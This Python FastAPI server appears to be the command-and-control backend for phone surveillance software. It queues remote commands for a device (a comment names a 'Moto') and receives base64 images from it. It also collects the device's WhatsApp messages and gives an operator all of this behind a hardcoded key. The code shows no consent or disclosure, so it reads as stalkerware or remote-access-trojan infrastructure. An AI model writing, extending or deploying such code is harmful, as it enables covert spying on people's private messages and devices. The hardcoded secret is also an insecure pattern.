from fastapi import FastAPI, Request, HTTPException
import time

app = FastAPI()
API_KEY = "MY_SECRET_KEY_123" 

device_data = {} 
command_queue = []
latest_image_b64 = "" 
latest_wa_chats = []  
debug_msg = "No debug info yet"

def check_key(request: Request):
    if request.headers.get("X-Key") != API_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

@app.post("/cmd")
async def get_commands(request: Request):
    check_key(request)
    data = await request.json()
    device_id = data.get("device_id")
    
    # Save the exact time the Moto checked in
    data["last_seen"] = time.time()
    device_data[device_id] = data
    
    cmds = list(command_queue)
    command_queue.clear()
    return {"commands": cmds}

@app.post("/result")
async def post_result(request: Request):
    global latest_image_b64, debug_msg
    check_key(request)
    data = await request.json()
    
    if "debug_text" in data:
        debug_msg = data["debug_text"]
        
    if "image_b64" in data:
        latest_image_b64 = data["image_b64"]
        
    return {"status": "ok"}

@app.post("/wa")
async def post_wa(request: Request):
    global latest_wa_chats
    check_key(request)
    data = await request.json()
    if "messages" in data:
        for msg in data["messages"]:
            latest_wa_chats.insert(0, msg)
        latest_wa_chats = latest_wa_chats[:50] 
    return {"status": "ok"}

@app.get("/state")
async def get_state(request: Request):
    check_key(request)
    
    # Check if the device has checked in within the last 15 seconds
    now = time.time()
    active_devices = {}
    for dev_id, info in device_data.items():
        if now - info.get("last_seen", 0) < 15:
            active_devices[dev_id] = info

    return {
        "devices": active_devices,
        "latest_image_b64": latest_image_b64,
        "wa_chats": latest_wa_chats,
        "debug_msg": debug_msg
    }

@app.post("/queue_cmd")
async def queue_command(request: Request):
    check_key(request)
    cmd = await request.json()
    command_queue.append(cmd)
    return {"status": "queued"}
